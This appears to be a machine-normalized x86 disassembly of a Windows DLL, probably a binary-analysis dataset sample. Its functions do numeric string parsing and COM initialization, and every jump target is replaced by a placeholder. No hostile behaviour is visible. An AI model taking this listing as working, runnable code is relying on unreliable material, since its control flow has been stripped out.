call sub_10007a10
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10064f10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_1002be90
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10069c00
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_10030ff0
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_10030ff0
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_10030ff0
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_1002839c
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_10030ff0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1000eff4
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10021130
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_1002839c
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1000eff4
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_100255aa
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_10013b13
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
xor eax eax
call sub_100262c3
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_10030ff0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x5c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp edi ebx
jbe r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc [ ebp - 0x64 ]
jmp r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc [ ebp - 0x64 ]
mov ecx [ ebp - 0x64 ]
inc [ eax + ecx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x60 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
movzx eax [ ebp - 0x60 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x58 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] bl
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x60 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
sub_10042442
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_100424b0
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_10042511
push 0x28
mov eax sub_1008547e
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x18
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
push ecx
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1006db5a
jmp r-xdata
lea ecx [ eax + 0x1c ]
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1007f3bd
pop ecx
pop ebp
retn 0xc
call sub_1005ab9c
sub_100425be
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006406d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_100426a0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x10 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
lea eax [ esi + 0x10 ]
mov [ edx + eax - 0x10 ] r--data
push eax
mov [ eax ] r--data
call sub_10027450
add esp 0x4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_100426dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_10020869
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_100669c6
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_100079e1
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_1004279c
push 0x4
mov eax sub_10085119
call sub_10026266
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1000c927
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov esi eax
mov eax [ eax ]
mov ecx esi
mov [ rw-data ] eax
call sub_10012437
push esi
call sub_1000a86e
pop ecx
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
call sub_10008d33
retn
sub_100427ea
push 0x28
mov eax sub_10085e3c
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_10030066
mov [ esi ] r--data
jmp r-xdata
sub_10042890
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_10003c9c
pop esi
mov esp ebp
pop ebp
retn
inc eax
mov [ esi + 0x4 ] eax
sub_100428ba
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100591cb
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_100428f0
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_1000cc80
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
je r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x84 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x84 ]
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x2c ]
mov eax 0xc1
call sub_1002f620
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x88 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x88 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x16
lea edx [ ebp - 0x8c ]
mov [ ebp - 0x8c ] ebx
call sub_10023960
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x84 ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x8c ]
mov eax [ ebp - 0x90 ]
push esi
add eax 0x128
call sub_10057520
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x60
jmp r-xdata
mov eax [ ebp - 0x88 ]
cmp eax ebx
je r-xdata
call sub_100324d0
jmp r-xdata
call sub_1002f620
sub_10042a70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x10 ]
push edx
push ebx
push eax
mov ecx esi
call sub_10071ec0
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10042b20
push ebp
mov ebp esp
push 0xffffffff
push sub_10086260
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push ebx
call [ CoInitializeEx@IAT ]
cmp eax ebx
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
push r--data
push 0x1
push ebx
push r--data
mov [ ebp - 0x18 ] ebx
call [ CoCreateInstance@IAT ]
mov [ ebp - 0x38 ] eax
cmp eax ebx
jge r-xdata
lea eax [ ebx + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_10044400
add esp 0x8
cmp [ ebp - 0x38 ] ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x38 ]
push eax
mov edi r--data
mov [ ebp - 0x14 ] ebx
call sub_100272b0
mov [ ebp - 0x4 ] ebx
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] ebx
mov ecx [ eax ]
push ebx
push eax
mov eax [ ecx + 0x38 ]
call eax
cmp eax ebx
jge r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
lea esi [ ebp - 0x14 ]
push esi
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
lea edi [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x4 ] 0xffffffff
call sub_100698c0
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi ebx
jge r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
cmp eax ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
mov ecx [ ebp - 0xc ]
